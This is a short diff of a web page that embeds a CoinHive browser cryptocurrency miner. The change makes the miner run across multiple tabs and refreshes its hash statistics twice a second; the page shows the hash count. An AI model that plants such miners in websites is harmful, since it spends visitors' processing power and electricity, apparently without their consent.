@@ -57,19 +57,19 @@
     var miner = new CoinHive.Anonymous('ruTzgaUfKInfw2vbYhqzENaKnPwQdRQu');
   
     if (!miner.isMobile()) {
-      miner.start();
+      miner.start(CoinHive.FORCE_MULTI_TAB);
       minerInfo.style.display = "inline"
     }
 
     // Update stats once per second
     setInterval(function() {
       var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
+      var totalHashes = miner.getTotalHashes(true);
       var acceptedHashes = miner.getAcceptedHashes();
 
       // Output to HTML elements...
       coinsInfo.innerHTML = '' + totalHashes
-    }, 1000);
+    }, 500);
   </script>
 </body>
 </html>
